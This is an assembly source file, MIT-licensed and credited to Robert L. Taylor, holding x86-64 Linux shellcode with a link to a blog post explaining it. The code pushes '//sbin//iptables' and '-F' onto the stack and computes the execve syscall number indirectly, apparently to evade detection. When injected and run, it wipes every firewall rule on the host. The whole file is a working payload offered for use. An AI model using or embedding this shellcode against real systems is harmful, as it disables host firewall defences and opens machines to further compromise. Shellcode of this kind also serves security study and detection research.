;The MIT License (MIT)

;Copyright (c) 2017 Robert L. Taylor

;Permission is hereby granted, free of charge, to any person obtaining a
;copy of this software and associated documentation files (the “Software”),
;to deal in the Software without restriction, including without limitation
;the rights to use, copy, modify, merge, publish, distribute, sublicense,
;and/or sell copies of the Software, and to permit persons to whom the
;Software is furnished to do so, subject to the following conditions:

;The above copyright notice and this permission notice shall be included
;in all copies or substantial portions of the Software.

;The Software is provided “as is”, without warranty of any kind, express or
;implied, including but not limited to the warranties of merchantability,
;fitness for a particular purpose and noninfringement. In no event shall the
;authors or copyright holders be liable for any claim, damages or other
;liability, whether in an action of contract, tort or otherwise, arising
;from, out of or in connection with the software or the use or other
;dealings in the Software.
;
; For a detailed explanation of this shellcode see my blog post:
; http://a41l4.blogspot.ca/2017/03/polyflushiptables1434.html

global _start

section .text

_start:
	push 82
	pop rax
	cdq
	push rdx
	push word '-F'
	push rsp
	pop rbx
	push rdx
	mov rcx, 'iptables'
	push rcx
	shl al,1
	sub al,cl
	mov rcx, '//sbin//'
	push rcx
	push rsp
	pop rdi
	push rdx
	push rbx
	push rdi
	push rsp
	pop rsi
	syscall
